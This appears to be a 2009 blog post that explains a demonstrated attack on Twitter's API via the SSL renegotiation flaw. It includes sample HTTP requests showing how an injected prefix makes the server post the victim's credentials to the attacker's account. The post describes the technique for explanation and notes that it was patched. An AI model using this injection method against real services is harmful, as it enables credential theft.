---
layout: post
title: SSL Renegotiation Vulnerability Exploited
comments: true
---

The [SSL renegotiation vulnerability](/2009/11/details-of-ssl-renegotiation-attack/) revealed earlier this month has been [demonstrated](http://www.securegoose.org/2009/11/tls-renegotiation-vulnerability-cve.html) by a Turkish grad student, named Anil Kurmus, to steal user names and passwords of Twitter. The code is also [available](http://perso.telecom-paristech.fr/~kurmus/ssl.c) in the wild.

Yes, it’s totally true that even the attacker can inject a small amount of message at the beginning, he’s still unable to read the encrypted data. But let’s see how Kurmus’ attack works. (Of course, this hole has been patched by Twitter)

You can update your Twitter status with its API by posting your new status to *http://twitter.com/statuses/update.xml*, as well as your user name and password. The message is something like below:

{% highlight http %}
POST /statuses/update.xml HTTP/1.1
Authorization: Basic username:password
User-Agent: curl/7.19.5
Host: twitter.com
Accept:*/*
Content-Length: 22
Content-Type: application/x-www-form-urlencoded
status=your new status
{% endhighlight %}

All that the attacker need to do is to inject a POST request header, and post the victim’s POST request to his own twitter account:

{% highlight http %}
POST /statuses/update.xml HTTP/1.1
Authorization: Basic username:password
User-Agent: curl/7.19.5
Host: twitter.com
Accept:*/*
Content-Length: 140
Content-Type: application/x-www-form-urlencoded
status=POST /statuses/update.xml HTTP/1.1
Authorization: Basic username:password
...
{% endhighlight %}

Obviously, the server would be fooled to post the victim’s credential, and now, the attacker gets the user name and password of the victim.
